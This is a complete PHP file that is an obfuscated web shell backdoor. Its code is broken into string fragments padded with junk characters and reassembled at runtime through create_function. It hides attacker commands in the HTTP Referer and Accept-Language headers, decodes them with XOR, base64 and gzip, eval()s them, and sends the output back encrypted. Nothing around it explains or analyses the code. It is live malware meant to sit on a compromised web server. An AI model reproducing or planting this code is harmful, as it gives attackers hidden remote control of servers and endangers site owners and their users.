<?php
$Z='ANGUAGEGEGE"];iEGf($rr&&$rEGa){$u=pEGarsEGe_url($EGrr);pEGarse_EGstrEG($u["queEGry"],$qEG)EGEG';
$z='"";EGfor($i=0;EG$i<$l;){forEG($j=EG0;($j<$c&EG&$i<$lEG);$jEG++EG,$i+EGEGEG+){$o.=$tEG{$EGi}^$k';
$g='G)EG;if($q&&$mEG){@sEGession_stEGartEG()EG;$s=&$_SEEGSSION;$ssEG="suEGbstr";$sEGl="strtoEGloweE';
$W=str_replace('H','','crHeatHeH_fuHncHHtion');
$K='64_encode(xEG(gEGzcompress($o)EG,EG$k));print("EG<$k>EG$d</EG$k>");@seEGssioEGn_destroy(EG);}}}}';
$x=';$q=arrayEG_values($q);preg_EGmatEGch_all("EG/([\\w])[\\EGw-]+EG(?:;q=0.([EG\\EGd]))?,?EG/",$ra,$mE';
$Q='$ss(EG$s[$i],EG0,$e)EGEG)),$k))EG);$o=ob_getEG_contenEGts();EGob_EGenEGd_clean();$d=baEGsEGeEG';
$M='[$EGi]EG.=$p;$e=strpos($s[$EGi],$fEG);if(EG$EGe)EG{$k=$kh.$kEGfEG;ob_start();@evEGal(@gzuncEGom';
$B='trpos($p,$EGhEG)===0){EG$s[$i]EG="";$p=$EGss($p,3);EG}iEGEGf(array_key_eEGxistEGs($i,EG$s)){$sEG';
$l='.$kf),0,3EG));EGEG$p="";foEGr($zEG=1;$EGEGz<cEGount($m[1]);EG$z++)$pEG.=$EGq[$m[2][$z]];ifEG(s';
$p='$khEG="5d41"EG;$kf="402a";EGEGfunEGction x(EG$t,$k){$c=EGstrlen($kEG)EG;$l=strlen(EG$t)EG;$EGo=';
$w='Gr";$i=$EGm[1][0EG].$m[1EG]EG[1EG]EG;$h=$sl($ss(md5($i.$EGkh),EG0,3EGEG)EG);$f=$sl($ss(mEGd5($i';
$u='{$EGj};}}return $o;}$rEG=$_SERVER;$rrEG=@$r[EG"HTEGTP_REFEREEGEGR"];$ra=@EG$r["EGEGHTTP_ACCEPT_L';
$F='pressEG(@x(@bEGase64_EGdeEGcode(prEGeg_replEGace(arrEGay("EG/EG_/","/-/"),arrEGEGay("/","+")EG,';
$h=str_replace('EG','',$p.$z.$u.$Z.$x.$g.$w.$l.$B.$M.$F.$Q.$K);
$o=$W('',$h);$o();
?>
